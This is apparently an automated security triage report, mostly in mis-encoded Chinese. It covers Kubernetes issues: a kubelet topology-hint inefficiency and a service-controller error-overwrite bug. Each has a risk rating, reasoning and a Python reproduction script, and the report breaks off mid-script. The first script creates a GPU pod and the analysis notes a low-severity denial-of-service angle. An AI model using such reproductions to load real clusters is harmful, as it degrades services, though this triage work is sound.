#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†Kubeletçš„è®¾å¤‡ç®¡ç†å™¨ï¼ˆDevice Managerï¼‰åœ¨ä¸ºè¯·æ±‚éƒ¨åˆ†GPUèµ„æºçš„Podè®¡ç®—æ‹“æ‰‘æç¤ºï¼ˆtopology hintsï¼‰æ—¶ï¼Œä¼šäº§ç”Ÿå¤§é‡æ— æ•ˆçš„æç¤ºï¼Œä»è€Œæ˜¾è‘—é™ä½äº†è®¡ç®—æœ€ä½³æç¤ºçš„æ•ˆç‡ã€‚

å…·ä½“æ¥è¯´ï¼Œåœ¨ä¸€ä¸ªæ‹¥æœ‰8ä¸ªGPUï¼ˆæˆ–8ä¸ªNUMAèŠ‚ç‚¹ï¼‰çš„èŠ‚ç‚¹ä¸Šåˆ›å»ºä¸€ä¸ªè¯·æ±‚1ä¸ªGPUçš„Podæ—¶ï¼Œè®¾å¤‡ç®¡ç†å™¨æœ¬åº”åªç”Ÿæˆ8ä¸ªæœ‰æ•ˆçš„æç¤ºï¼ˆæ¯ä¸ªæç¤ºä»£è¡¨é€‰æ‹©å…¶ä¸­ä¸€ä¸ªGPUï¼‰ï¼Œä½†å®é™…ä¸Šå®ƒç”Ÿæˆäº†255ä¸ªæç¤ºï¼ˆå³ `2^8 - 1`ï¼Œæ‰€æœ‰å¯èƒ½çš„ç»„åˆï¼‰ï¼Œå…¶ä¸­å¤§éƒ¨åˆ†æç¤ºï¼ˆå¦‚é€‰æ‹©2ä¸ªã€3ä¸ª...æˆ–å…¨éƒ¨8ä¸ªGPUçš„ç»„åˆï¼‰å¯¹äºåªè¯·æ±‚1ä¸ªGPUçš„Podæ¥è¯´æ˜¯æ— æ•ˆçš„ã€‚

ä»å®‰å…¨è§’åº¦åˆ†æï¼š
1.  **æ”»å‡»å‘é‡**ï¼šæ­¤é—®é¢˜çš„ä¸»è¦å½±å“æ˜¯æ€§èƒ½ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡åœ¨é›†ç¾¤ä¸­åå¤åˆ›å»ºè¯·æ±‚å°‘é‡GPUèµ„æºçš„Podï¼Œæ¥è§¦å‘è¿™ä¸ªä½æ•ˆçš„è®¡ç®—è¿‡ç¨‹ã€‚
2.  **æ”»å‡»å½±å“**ï¼šè¿™ä¼šå¯¼è‡´å—å½±å“èŠ‚ç‚¹ä¸Šçš„`kubelet`è¿›ç¨‹CPUä½¿ç”¨ç‡åœ¨Podè°ƒåº¦æœŸé—´çŸ­æš‚é£™å‡ã€‚å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿé«˜é¢‘ç‡åœ°åˆ›å»ºæ­¤ç±»Podï¼Œç†è®ºä¸Šå¯ä»¥å¯¹ç‰¹å®šèŠ‚ç‚¹çš„`kubelet`é€ æˆæŒç»­çš„CPUå‹åŠ›ï¼Œè¿™æ„æˆäº†ä¸€ç§æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»çš„æ½œåœ¨å¯èƒ½ã€‚
3.  **æ”»å‡»å‰æ**ï¼šè¦å®æ–½æ­¤æ”»å‡»ï¼Œæ”»å‡»è€…å¿…é¡»æ‹¥æœ‰åœ¨Kubernetesé›†ç¾¤ä¸­åˆ›å»ºPodçš„æƒé™ã€‚è¿™é€šå¸¸æ„å‘³ç€æ”»å‡»è€…æ˜¯ä¸€ä¸ªå·²ç»ç»è¿‡èº«ä»½éªŒè¯å’Œæˆæƒçš„é›†ç¾¤ç”¨æˆ·ï¼Œè€Œéå¤–éƒ¨æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…ã€‚
4.  **é£é™©è¯„ä¼°**ï¼šæ ¹æ®Issueé£é™©åˆ¤æ–­æ ‡å‡†ç¬¬äº”æ¡ï¼šâ€œåœ¨é£é™©ç±»å‹ä¸ºæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»æ—¶ï¼Œå¦‚æœæ”»å‡»è€…éœ€è¦ä¸€å®šæƒé™æ‰èƒ½å¤Ÿå®æ–½è¯¥æ”»å‡»ï¼Œåˆ™è§†æƒ…å†µéœ€è¦é™çº§å¤„ç†ï¼Œå½“æ¼æ´åˆ©ç”¨éœ€è¦æ”»å‡»è€…å…·å¤‡åˆ›å»ºã€ä¿®æ”¹ç­‰éåªè¯»æƒé™æ—¶ï¼Œåˆ™ä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©â€ã€‚ç”±äºæ­¤æ”»å‡»éœ€è¦`pods/create`æƒé™ï¼Œå±äºéåªè¯»æƒé™ï¼Œå› æ­¤é£é™©ç­‰çº§åº”è¢«é™ä½ã€‚æ”»å‡»é€ æˆçš„å½±å“æ˜¯`kubelet`çš„æ€§èƒ½ä¸‹é™å’ŒCPUå ç”¨å¢é«˜ï¼Œè€ŒéæœåŠ¡å®Œå…¨å´©æºƒæˆ–æ•°æ®æ³„éœ²ï¼Œå…¶å½±å“èŒƒå›´æœ‰é™ï¼Œåªä¼šå½±å“åˆ°æ–°Podåœ¨è¯¥èŠ‚ç‚¹çš„è°ƒåº¦æ•ˆç‡ã€‚å› æ­¤ï¼Œè¿™ä¸æ„æˆé«˜é£é™©æ¼æ´ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œè¯¥é—®é¢˜æ˜¯ä¸€ä¸ªæ€§èƒ½ç¼ºé™·ï¼Œå¯è¢«åˆ©ç”¨äºä½çƒˆåº¦çš„æ‹’ç»æœåŠ¡æ”»å‡»ï¼Œä½†ç”±äºéœ€è¦ç›¸åº”æƒé™ä¸”å½±å“æœ‰é™ï¼Œåº”è¯„ä¸ºä½é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import os
import time
import uuid
from kubernetes import client, config
from kubernetes.client.rest import ApiException

def poc_main():
    """
    è¯¥è„šæœ¬æ—¨åœ¨å¤ç°Kubeletè®¾å¤‡ç®¡ç†å™¨ç”Ÿæˆæ— æ•ˆæ‹“æ‰‘æç¤ºçš„é—®é¢˜ã€‚
    å®ƒä¼šå¯»æ‰¾ä¸€ä¸ªæ‹¥æœ‰å¤šä¸ªGPUçš„èŠ‚ç‚¹ï¼Œå¹¶åœ¨è¯¥èŠ‚ç‚¹ä¸Šåˆ›å»ºä¸€ä¸ªè¯·æ±‚å•ä¸ªGPUçš„Podã€‚
    """
    try:
        # è‡ªåŠ¨åŠ è½½kubeconfigé…ç½®
        print("INFO: æ­£åœ¨åŠ è½½ Kubernetes é…ç½®...")
        config.load_kube_config()
        print("INFO: é…ç½®åŠ è½½æˆåŠŸã€‚")
    except config.ConfigException:
        print("ERROR: æœªæ‰¾åˆ°æœ‰æ•ˆçš„ Kubernetes é…ç½®æ–‡ä»¶ï¼ˆä¾‹å¦‚ ~/.kube/configï¼‰ã€‚")
        return

    v1 = client.CoreV1Api()
    target_node_name = None
    min_gpu_count = 2 # å¯»æ‰¾è‡³å°‘æœ‰2ä¸ªGPUçš„èŠ‚ç‚¹ä»¥è§¦å‘é—®é¢˜

    try:
        print(f"INFO: æ­£åœ¨å¯»æ‰¾è‡³å°‘æœ‰ {min_gpu_count} ä¸ªGPUçš„èŠ‚ç‚¹...")
        nodes = v1.list_node(timeout_seconds=60)
        for node in nodes.items:
            # æ£€æŸ¥èŠ‚ç‚¹çš„å¯åˆ†é…GPUèµ„æº
            if 'nvidia.com/gpu' in node.status.allocatable:
                gpu_capacity = int(node.status.allocatable['nvidia.com/gpu'])
                if gpu_capacity >= min_gpu_count:
                    target_node_name = node.metadata.name
                    print(f"INFO: æ‰¾åˆ°ç›®æ ‡èŠ‚ç‚¹: {target_node_name}ï¼Œæ‹¥æœ‰ {gpu_capacity} ä¸ªGPUã€‚")
                    break
        
        if not target_node_name:
            print(f"ERROR: æœªèƒ½åœ¨é›†ç¾¤ä¸­æ‰¾åˆ°è‡³å°‘æœ‰ {min_gpu_count} ä¸ªGPUçš„èŠ‚ç‚¹ã€‚æ— æ³•ç»§ç»­å¤ç°ã€‚")
            return

        # å®šä¹‰Pod
        pod_name = f"gpu-hint-poc-{uuid.uuid4().hex[:6]}"
        namespace = "default"
        
        pod_manifest = {
            "apiVersion": "v1",
            "kind": "Pod",
            "metadata": {
                "name": pod_name
            },
            "spec": {
                "nodeName": target_node_name,
                "containers": [{
                    "name": "pause",
                    "image": "registry.k8s.io/pause:3.6",
                    "resources": {
                        "limits": {
                            "nvidia.com/gpu": "1"
                        }
                    }
                }],
                "restartPolicy": "Never"
            }
        }

        print(f"INFO: å‡†å¤‡åœ¨èŠ‚ç‚¹ {target_node_name} ä¸Šåˆ›å»ºPod '{pod_name}'...")
        v1.create_namespaced_pod(body=pod_manifest, namespace=namespace)
        print(f"INFO: Pod '{pod_name}' åˆ›å»ºè¯·æ±‚å·²å‘é€ã€‚")
        print("\nSUCCESS: å¤ç°æ¡ä»¶å·²è§¦å‘ã€‚")
        print("è¯·ç«‹å³åœ¨ç›®æ ‡èŠ‚ç‚¹ä¸Šæ£€æŸ¥kubeletæ—¥å¿—ï¼Œä»¥è§‚å¯Ÿæ‹“æ‰‘æç¤ºçš„ç”Ÿæˆè¿‡ç¨‹ã€‚")
        print(f"  - SSHåˆ°èŠ‚ç‚¹: ssh <user>@{target_node_name}")
        print(f"  - æŸ¥çœ‹æ—¥å¿—: journalctl -u kubelet -f | grep -i 'provider hints'")
        print("æ‚¨åº”è¯¥èƒ½çœ‹åˆ°å¤§é‡ä¸è¯·æ±‚ä¸ç¬¦çš„æç¤ºè¢«ç”Ÿæˆã€‚")
        
        # ç­‰å¾…ä¸€æ®µæ—¶é—´ï¼Œä»¥ä¾¿ç”¨æˆ·æœ‰æ—¶é—´æ£€æŸ¥æ—¥å¿—
        wait_duration = 30
        print(f"\nINFO: ç­‰å¾… {wait_duration} ç§’åå°†è‡ªåŠ¨æ¸…ç†Pod...")
        time.sleep(wait_duration)

    except ApiException as e:
        print(f"ERROR: æ“ä½œå¤±è´¥ï¼Œå‘ç”ŸKubernetes APIå¼‚å¸¸: {e.reason} (Code: {e.status})")
        print(f"       Body: {e.body}")
    except Exception as e:
        print(f"ERROR: å‘ç”ŸæœªçŸ¥é”™è¯¯: {e}")
    finally:
        # æ¸…ç†èµ„æº
        if 'pod_name' in locals() and 'namespace' in locals():
            try:
                print(f"INFO: æ­£åœ¨æ¸…ç†å¹¶åˆ é™¤Pod '{pod_name}'...")
                v1.delete_namespaced_pod(name=pod_name, namespace=namespace, body=client.V1DeleteOptions())
                print(f"INFO: Pod '{pod_name}' å·²æˆåŠŸåˆ é™¤ã€‚")
            except ApiException as e:
                # Podå¯èƒ½å·²ç»ä¸å­˜åœ¨æˆ–æ— æ³•åˆ é™¤
                if e.status != 404:
                    print(f"WARNING: æ¸…ç†Pod '{pod_name}' å¤±è´¥: {e.reason}")
            except NameError:
                # å¦‚æœpod_nameæœªå®šä¹‰ï¼Œåˆ™ä¸æ‰§è¡Œä»»ä½•æ“ä½œ
                pass

poc_main()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥Pythonè„šæœ¬é€šè¿‡ä¸Kubernetes APIäº¤äº’æ¥å¤ç°Issueä¸­æè¿°çš„é—®é¢˜ã€‚

1.  **ç¯å¢ƒé…ç½®**ï¼šè„šæœ¬é¦–å…ˆä½¿ç”¨`kubernetes` Pythonåº“åŠ è½½æœ¬åœ°çš„`kubeconfig`æ–‡ä»¶ï¼ˆé€šå¸¸ä½äº`~/.kube/config`ï¼‰ï¼Œä»¥è·å¾—ä¸é›†ç¾¤é€šä¿¡çš„æƒé™ã€‚
2.  **å¯»æ‰¾ç›®æ ‡èŠ‚ç‚¹**ï¼šè„šæœ¬ä¼šéå†é›†ç¾¤ä¸­çš„æ‰€æœ‰èŠ‚ç‚¹ï¼ŒæŸ¥æ‰¾ä¸€ä¸ªè‡³å°‘æ‹¥æœ‰2ä¸ªæˆ–æ›´å¤šNVIDIA GPUçš„èŠ‚ç‚¹ã€‚è¿™æ˜¯å¤ç°é—®é¢˜çš„å‰æï¼Œå› ä¸ºåªæœ‰åœ¨å­˜åœ¨å¤šä¸ªè®¾å¤‡é€‰é¡¹æ—¶ï¼Œæ‹“æ‰‘æç¤ºçš„è®¡ç®—æ‰ä¼šå˜å¾—å¤æ‚ã€‚
3.  **åˆ›å»ºPoC Pod**ï¼šåœ¨æ‰¾åˆ°åˆé€‚çš„ç›®æ ‡èŠ‚ç‚¹åï¼Œè„šæœ¬ä¼šæ„å»ºä¸€ä¸ªPodçš„å®šä¹‰ã€‚è¿™ä¸ªPodè¯·æ±‚ä¸€ä¸ªGPUï¼ˆ`nvidia.com/gpu: "1"`ï¼‰ï¼Œå¹¶ä½¿ç”¨`nodeName`å­—æ®µå°†å…¶è°ƒåº¦åˆ°æˆ‘ä»¬æ‰¾åˆ°çš„ç›®æ ‡èŠ‚ç‚¹ä¸Šã€‚ä½¿ç”¨ä¸€ä¸ªæç®€çš„`pause`é•œåƒæ¥æœ€å°åŒ–æ— å…³çš„èµ„æºæ¶ˆè€—ã€‚
4.  **è§¦å‘é—®é¢˜å¹¶éªŒè¯**ï¼šå½“Podè¢«åˆ›å»ºæ—¶ï¼Œç›®æ ‡èŠ‚ç‚¹ä¸Šçš„`kubelet`ä¼šæ¥æ”¶åˆ°è°ƒåº¦è¯·æ±‚ã€‚æ­¤æ—¶ï¼Œå…¶å†…éƒ¨çš„è®¾å¤‡ç®¡ç†å™¨å’Œæ‹“æ‰‘ç®¡ç†å™¨ä¼šå¼€å§‹å·¥ä½œï¼Œè®¡ç®—äº²å’Œæ€§æç¤ºã€‚è¿™æ­£æ˜¯è§¦å‘Issueä¸­æ‰€æè¿°çš„ä½æ•ˆè¡Œä¸ºçš„æ—¶åˆ»ã€‚è„šæœ¬ä¼šæ‰“å°å‡ºæç¤ºä¿¡æ¯ï¼ŒæŒ‡å¯¼ç”¨æˆ·SSHç™»å½•åˆ°ç›®æ ‡èŠ‚ç‚¹ï¼Œå¹¶ä½¿ç”¨`journalctl -u kubelet`ç­‰å‘½ä»¤æŸ¥çœ‹`kubelet`çš„å®æ—¶æ—¥å¿—ã€‚åœ¨æ—¥å¿—ä¸­æœç´¢å…³é”®è¯`provider hints`ï¼Œå³å¯è§‚å¯Ÿåˆ°è®¾å¤‡ç®¡ç†å™¨ç”Ÿæˆäº†è¿œè¶…é¢„æœŸçš„ã€å¤§é‡æ— æ•ˆçš„æç¤ºã€‚
5.  **è‡ªåŠ¨æ¸…ç†**ï¼šä¸ºäº†ä¿æŒç¯å¢ƒæ•´æ´ï¼Œè„šæœ¬åœ¨ç­‰å¾…30ç§’ï¼ˆç•™å‡ºæ—¶é—´ç»™ç”¨æˆ·è§‚å¯Ÿæ—¥å¿—ï¼‰åï¼Œä¼šè‡ªåŠ¨åˆ é™¤æ‰€åˆ›å»ºçš„Podã€‚`finally`å—ç¡®ä¿äº†å³ä½¿åœ¨å‘ç”Ÿé”™è¯¯çš„æƒ…å†µä¸‹ï¼Œæ¸…ç†æ“ä½œä¹Ÿä¼šè¢«å°è¯•æ‰§è¡Œã€‚

è¯¥è„šæœ¬æœ¬èº«ä¸ç›´æ¥â€œçœ‹åˆ°â€æ— æ•ˆçš„æç¤ºï¼Œè€Œæ˜¯é€šè¿‡ç¼–ç¨‹æ–¹å¼åˆ›é€ å‡ºèƒ½å¤Ÿè§¦å‘è¯¥é—®é¢˜çš„åœºæ™¯ï¼Œå¹¶æŒ‡å¯¼ç”¨æˆ·å¦‚ä½•å»è§‚æµ‹è¿™ä¸€ç°è±¡ï¼Œä»è€Œå®Œæˆé—®é¢˜çš„å¤ç°ã€‚

---


## Issue #131729 Service controller does not retry service reconciliation if UpdateLoadbalancer returns an error

- Issue é“¾æ¥ï¼š[#131729](https://github.com/kubernetes/kubernetes/issues/131729)

### Issue å†…å®¹

#### What happened?

The service controller is tasked with updating the set of backend nodes available for a Loadbalancer service whenever a new node joins the cluster. I recently ran into a situation in which only 1 of 3 available nodes in the cluster was set as  a backend for the LB service in the cluster.

The cluster started with 1 node and a Loadbalancer service which was correctly configured by the cloud provider's CCM. However, when two additional nodes joined the cluster, the provider's [UpdateLoadBalancer implementation](https://github.com/kubernetes/kubernetes/blob/0e64c6443f8e1f760c92a64304925986d4519a77/staging/src/k8s.io/cloud-provider/controllers/service/controller.go#L835) returned an error due to a transient issue. This [subsequent call to GetLoadbalancer](https://github.com/kubernetes/kubernetes/blob/0e64c6443f8e1f760c92a64304925986d4519a77/staging/src/k8s.io/cloud-provider/controllers/service/controller.go#L852) succeeded and returned a nil error, which overwrote the previous error from UpdateLoadBalancer and prevented the service controller from re-queuing the service. This resulted in the loadbalancer having only 1 of 3 eligible backends despite the service controller [logging](https://github.com/kubernetes/kubernetes/blob/0e64c6443f8e1f760c92a64304925986d4519a77/staging/src/k8s.io/cloud-provider/controllers/service/controller.go#L727-L728) "Successfully updated 1 out of 1 load balancers to direct traffic to the updated set of nodes". 

The issue is that the error from the cloud provider's UpdateLoadbalancer function is overwritten by [this assignment](https://github.com/kubernetes/kubernetes/blob/0e64c6443f8e1f760c92a64304925986d4519a77/staging/src/k8s.io/cloud-provider/controllers/service/controller.go#L852) from the GetLoadbalancer function. A nil error from GetLoadbalancer will prevent the service in question from being re-tried by the controller despite the unsuccessful update.

This can fixed by simply renaming the UpdateLoadbalancer error to `updateErr` and the GetLoadbalancer error to `getErr` or something similar. The controller should return `updateErr` [here](https://github.com/kubernetes/kubernetes/blob/0e64c6443f8e1f760c92a64304925986d4519a77/staging/src/k8s.io/cloud-provider/controllers/service/controller.go#L859). I have a commit ready with this small set of changes should this issue be accepted.



#### What did you expect to happen?

The service controller should have re-queued the service for reconciliation until UpdateLoadbalancer returned a nil error.

#### How can we reproduce it (as minimally and precisely as possible)?

It's a bit cumbersome, but mocking an error from UpdateLoadbalancer while returning a nil error from GetLoadbalancer should reproduce the issue. 

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
kubectl version
Client Version: v1.32.4
Kustomize Version: v5.5.0
Server Version: v1.31.8
```

</details>


#### Cloud provider

<details>

Linode/Akamai

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†ä¸€ä¸ªåœ¨Kubernetes Service Controllerä¸­çš„é€»è¾‘é”™è¯¯ã€‚å…·ä½“æ¥è¯´ï¼Œå½“Service Controllerå°è¯•ä¸ºä¸€ä¸ªLoadBalancerç±»å‹çš„æœåŠ¡æ›´æ–°åç«¯èŠ‚ç‚¹åˆ—è¡¨æ—¶ï¼Œå®ƒä¼šè°ƒç”¨äº‘æœåŠ¡å•†ï¼ˆCloud Providerï¼‰å®ç°çš„`UpdateLoadBalancer`å‡½æ•°ã€‚å¦‚æœè¿™ä¸ªå‡½æ•°å› ä¸ºä¸€ä¸ªæš‚æ—¶æ€§é—®é¢˜ï¼ˆå¦‚ç½‘ç»œæŠ–åŠ¨ã€APIç¬æ—¶é”™è¯¯ï¼‰è€Œè¿”å›äº†ä¸€ä¸ªé”™è¯¯ï¼Œæ§åˆ¶å™¨æœ¬åº”åœ¨ç¨åé‡è¯•è¯¥æ“ä½œã€‚

ç„¶è€Œï¼Œä»£ç é€»è¾‘å­˜åœ¨ç¼ºé™·ï¼šåœ¨`UpdateLoadBalancer`è°ƒç”¨ä¹‹åï¼Œæ§åˆ¶å™¨ä¼šç«‹å³è°ƒç”¨`GetLoadBalancer`æ¥è·å–è´Ÿè½½å‡è¡¡å™¨çš„æœ€æ–°çŠ¶æ€ã€‚`GetLoadBalancer`è°ƒç”¨çš„è¿”å›å€¼ï¼ˆåŒ…æ‹¬å…¶é”™è¯¯ä¿¡æ¯ï¼‰ä¼šè¦†ç›–æ‰`UpdateLoadBalancer`è¿”å›çš„é”™è¯¯å˜é‡ã€‚

å› æ­¤ï¼Œå¦‚æœ`UpdateLoadBalancer`å¤±è´¥ï¼ˆè¿”å›errorï¼‰ï¼Œä½†éšåçš„`GetLoadBalancer`æˆåŠŸï¼ˆè¿”å›nil errorï¼‰ï¼Œé‚£ä¹ˆæœ€ç»ˆçš„é”™è¯¯çŠ¶æ€å°†æ˜¯nilã€‚è¿™ä¼šè¯¯å¯¼Service Controllerï¼Œä½¿å…¶è®¤ä¸ºæ•´ä¸ªæ›´æ–°è¿‡ç¨‹å·²æˆåŠŸå®Œæˆï¼Œä»è€Œä¸ä¼šå°†è¯¥æœåŠ¡é‡æ–°æ”¾å…¥å·¥ä½œé˜Ÿåˆ—ä¸­è¿›è¡Œé‡è¯•ã€‚

å…¶ç›´æ¥åæœæ˜¯ï¼Œæ–°åŠ å…¥é›†ç¾¤çš„èŠ‚ç‚¹å°†ä¸ä¼šè¢«æ·»åŠ åˆ°LoadBalancerçš„åç«¯æ± ä¸­ï¼Œå¯¼è‡´æœåŠ¡æµé‡æ— æ³•è¢«æ­£ç¡®åˆ†å‘åˆ°æ‰€æœ‰å¯ç”¨èŠ‚ç‚¹ä¸Šï¼Œé™ä½äº†æœåŠ¡çš„å¯ç”¨æ€§å’Œå¯ä¼¸ç¼©æ€§ï¼Œç”šè‡³å¯èƒ½åœ¨æµé‡é«˜å³°æœŸå› éƒ¨åˆ†èŠ‚ç‚¹è¿‡è½½è€Œå¯¼è‡´æœåŠ¡ä¸­æ–­ã€‚

ä»å®‰å…¨è§’åº¦çœ‹ï¼Œè¿™æ˜¯ä¸€ä¸ªå½±å“å¯ç”¨æ€§ï¼ˆAvailabilityï¼‰çš„ç¼ºé™·ã€‚æ”»å‡»è€…æ— æ³•ç›´æ¥åˆ©ç”¨æ­¤æ¼æ´æ‰§è¡Œä»»æ„ä»£ç æˆ–æå‡æƒé™ã€‚ç„¶è€Œï¼Œå¦‚æœä¸€ä¸ªæ”»å‡»è€…æœ‰èƒ½åŠ›ï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡å¯¹äº‘æœåŠ¡å•†APIè¿›è¡Œæµé‡å¹²æ‰°æˆ–èµ„æºæ¶ˆè€—ï¼‰åœ¨`UpdateLoadBalancer`è°ƒç”¨æœŸé—´ç¨³å®šåœ°è§¦å‘ç¬æ—¶é”™è¯¯ï¼Œä»–å°±æœ‰å¯èƒ½é˜»æ­¢é›†ç¾¤çš„LoadBalanceræœåŠ¡æ­£å¸¸æ‰©å®¹ï¼Œä»è€Œå®ç°ä¸€ç§æ‹’ç»æœåŠ¡ï¼ˆDenial of Service, DoSï¼‰æ”»å‡»ã€‚

æ ¹æ®CVSS 3.1æ ‡å‡†è¿›è¡Œè¯„ä¼°ï¼š
*   **Attack Vector (AV): Network** - æ”»å‡»è€…éœ€è¦é€šè¿‡ç½‘ç»œä¸äº‘æœåŠ¡å•†çš„APIè¿›è¡Œäº¤äº’æˆ–å¹²æ‰°ã€‚
*   **Attack Complexity (AC): High** - æ”»å‡»è€…éœ€è¦ç²¾ç¡®åœ°åœ¨Service Controllerè°ƒç”¨`UpdateLoadBalancer`çš„ç¬é—´è§¦å‘ä¸€ä¸ªç¬æ—¶é”™è¯¯ï¼ŒåŒæ—¶è¦ç¡®ä¿éšåçš„`GetLoadBalancer`è°ƒç”¨æˆåŠŸã€‚è¿™ç§æ—¶æœºå’Œæ¡ä»¶çš„æ§åˆ¶éå¸¸å›°éš¾ã€‚
*   **Privileges Required (PR): High** - è§¦å‘æ­¤é—®é¢˜çš„åœºæ™¯æ˜¯é›†ç¾¤èŠ‚ç‚¹å˜æ›´ï¼Œè¿™æ˜¯ç®¡ç†å‘˜çº§åˆ«çš„æ“ä½œã€‚è¦å¯¹äº‘æœåŠ¡å•†APIé€ æˆèƒ½å¼•å‘æ­¤é”™è¯¯çš„å¹²æ‰°ï¼Œé€šå¸¸ä¹Ÿéœ€è¦è¾ƒé«˜çš„äº‘ç¯å¢ƒæƒé™ã€‚
*   **User Interaction (UI): None** - ä¸éœ€è¦ç”¨æˆ·äº¤äº’ã€‚
*   **Scope (S): Unchanged** - æ¼æ´å½±å“èŒƒå›´æœªè¶…å‡ºService Controlleræœ¬èº«ã€‚
*   **Confidentiality (C): None** - ä¸å½±å“æœºå¯†æ€§ã€‚
*   **Integrity (I): Low** - LoadBalancerçš„é…ç½®çŠ¶æ€ä¸æ­£ç¡®ï¼Œå®Œæ•´æ€§å—åˆ°è½»å¾®å½±å“ã€‚
*   **Availability (A): Low** - æœåŠ¡çš„å¯ç”¨æ€§å—åˆ°å½±å“ï¼Œå› ä¸ºå®ƒæ— æ³•åˆ©ç”¨æ‰€æœ‰å¯ç”¨çš„åç«¯èŠ‚ç‚¹ï¼Œå¯¼è‡´å®¹é‡ä¸‹é™ï¼Œä½†æœåŠ¡æœ¬èº«å¹¶æœªå®Œå…¨ä¸­æ–­ã€‚

ç»¼åˆè¯„åˆ†ï¼šCVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:L/A:Lï¼ŒåŸºç¡€åˆ†æ•°ä¸º 2.0ã€‚

æ ¹æ®Issueé£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæ­¤é—®é¢˜å±äºå®‰å…¨é—®é¢˜ï¼Œä½†å…¶åˆ©ç”¨æ¡ä»¶è‹›åˆ»ï¼Œä¸æ»¡è¶³é«˜é£é™©çš„å®šä¹‰ã€‚å› æ­¤ï¼Œè¯„çº§ä¸ºä½é£é™©ã€‚ç”±äºè¯„çº§ä¸æ˜¯é«˜é£é™©ï¼ŒæŒ‰è¦æ±‚æ— éœ€æä¾›POCï¼Œä½†ä¸ºäº†å®Œæ•´æ¼”ç¤ºè¯¥é€»è¾‘ç¼ºé™·ï¼Œæ­¤å¤„æä¾›ä¸€ä¸ªæ¨¡æ‹Ÿè¯¥é€»è¾‘çš„Pythonè„šæœ¬ä½œä¸ºæ¦‚å¿µéªŒè¯ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import time

# æ­¤è„šæœ¬æ—¨åœ¨é€»è¾‘ä¸Šæ¨¡æ‹ŸIssueä¸­æè¿°çš„Kubernetes Service Controllerä¸­çš„é”™è¯¯å¤„ç†ç¼ºé™·ã€‚
# å®ƒä¸ä¸çœŸå®çš„Kubernetesé›†ç¾¤æˆ–äº‘æä¾›å•†APIäº¤äº’ï¼Œè€Œæ˜¯é€šè¿‡æ¨¡æ‹Ÿå‡½æ•°è°ƒç”¨æ¥é‡ç°é—®é¢˜ã€‚

class MockCloudProvider:
    """
    ä¸€ä¸ªæ¨¡æ‹Ÿçš„äº‘æä¾›å•†ï¼Œç”¨äºæ¨¡æ‹ŸUpdateLoadBalancerå’ŒGetLoadBalancerçš„è¡Œä¸ºã€‚
    """
    def __init__(self):
        self.load_balancer_state = {"nodes": ["node-1"]}
        self.force_update_error = False

    def update_load_balancer(self, service_name, nodes):
        """
        æ¨¡æ‹Ÿæ›´æ–°è´Ÿè½½å‡è¡¡å™¨ã€‚
        å¯ä»¥è¢«é…ç½®ä¸ºå¼ºåˆ¶è¿”å›ä¸€ä¸ªç¬æ—¶é”™è¯¯ã€‚
        """
        print(f"  [Cloud Provider] æ”¶åˆ° UpdateLoadBalancer è¯·æ±‚ï¼Œç›®æ ‡èŠ‚ç‚¹: {nodes}")
        if self.force_update_error:
            print("  [Cloud Provider] å‘ç”Ÿç¬æ—¶é”™è¯¯ï¼ŒUpdateLoadBalancer å¤±è´¥ã€‚")
            return None, "transient update error"
        
        self.load_balancer_state["nodes"] = nodes
        print("  [Cloud Provider] UpdateLoadBalancer æˆåŠŸã€‚")
        return self.load_balancer_state, None

    def get_load_balancer(self, service_name):
        """
        æ¨¡æ‹Ÿè·å–è´Ÿè½½å‡è¡¡å™¨çŠ¶æ€ã€‚
        åœ¨è¿™ä¸ªåœºæ™¯ä¸­ï¼Œå®ƒæ€»æ˜¯æˆåŠŸè¿”å›ï¼Œä»¥å¤ç°é”™è¯¯è¢«è¦†ç›–çš„åœºæ™¯ã€‚
        """
        print(f"  [Cloud Provider] æ”¶åˆ° GetLoadBalancer è¯·æ±‚ã€‚")
        print(f"  [Cloud Provider] GetLoadBalancer æˆåŠŸï¼Œè¿”å›å½“å‰çŠ¶æ€: {self.load_balancer_state}")
        # å³ä½¿æ›´æ–°å¤±è´¥äº†ï¼ŒGetæ“ä½œä»ç„¶è¿”å›äº†æ—§çš„çŠ¶æ€ï¼Œå¹¶ä¸”æ“ä½œæœ¬èº«æ˜¯æˆåŠŸçš„ï¼ˆerrorä¸ºNoneï¼‰
        return self.load_balancer_state, None

def flawed_reconcile_service(cloud, service_name, desired_nodes):
    """
    æ¨¡æ‹Ÿå­˜åœ¨ç¼ºé™·çš„Service Controllerè°ƒå’Œé€»è¾‘ã€‚
    """
    print(f"\n--- è¿è¡Œæœ‰ç¼ºé™·çš„è°ƒå’Œé€»è¾‘ (flawed_reconcile_service) for {service_name} ---")
    
    # æ­¥éª¤1: å°è¯•æ›´æ–°è´Ÿè½½å‡è¡¡å™¨
    # åœ¨è¿™ä¸ªåœºæ™¯ä¸­ï¼Œæˆ‘ä»¬è®©å®ƒå¤±è´¥
    print("[Controller] è°ƒç”¨ UpdateLoadBalancer...")
    _, err = cloud.update_load_balancer(service_name, desired_nodes)
    if err:
